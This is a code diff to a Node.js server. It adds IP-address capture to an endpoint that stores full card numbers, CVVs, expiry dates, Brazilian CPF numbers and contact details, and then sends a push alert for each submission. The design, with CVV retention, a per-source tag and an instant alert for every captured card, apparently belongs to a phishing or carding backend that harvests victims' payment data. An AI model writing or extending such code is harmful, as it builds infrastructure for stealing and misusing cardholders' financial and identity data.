@@ -75,6 +75,7 @@ async function initDB() {
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_level  TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_type   TEXT`);
   await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS source      TEXT`);
+  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS ip          TEXT`);
   await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_cpf    ON saved_cards(cpf)`);
   await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_source ON saved_cards(source)`);
   console.log('[DB] Tabela pronta.');
@@ -153,12 +154,14 @@ app.post('/api/cards', async (req, res) => {
     if (cpfClean.length !== 11)
       return res.status(400).json({ ok: false, message: 'CPF inválido.' });
 
+    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || null;
+
     // Sempre insere novo registro — fase de testes, todos os cartões são salvos
     const id = uuidv4();
     await pool.query(
-      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type, source)
-       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)`,
-      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null, source||null]
+      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type, source, ip)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)`,
+      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null, source||null, ip]
     );
 
     notificarPushcut(
